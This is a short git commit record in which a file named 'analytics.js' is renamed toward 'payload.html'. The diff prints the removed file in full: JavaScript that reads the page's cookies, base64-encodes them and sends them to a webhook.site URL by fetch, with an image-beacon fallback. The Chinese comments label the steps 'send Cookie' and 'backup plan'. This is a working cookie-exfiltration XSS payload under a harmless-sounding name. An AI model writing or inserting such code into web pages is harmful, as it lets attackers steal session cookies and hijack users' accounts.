194b9e4c0a4633b5881bfd7c6054e81c0785083f
Pariston-Hill <156459246+Pariston-Hill@users.noreply.github.com>
2026-04-28 20:02:15 +1000

    Update and rename analytics.js to payload.html

--- analytics.js
+++
@@ -1,5 +0,0 @@
-var webhook = "https://webhook.site/0b927305-6673-4353-8e4c-b7b7046d7071?";
-// 发送 Cookie
-fetch(webhook + "data=" + btoa(document.cookie), { mode: 'no-cors' });
-// 备用方案
-new Image().src = webhook + "c=" + document.cookie;
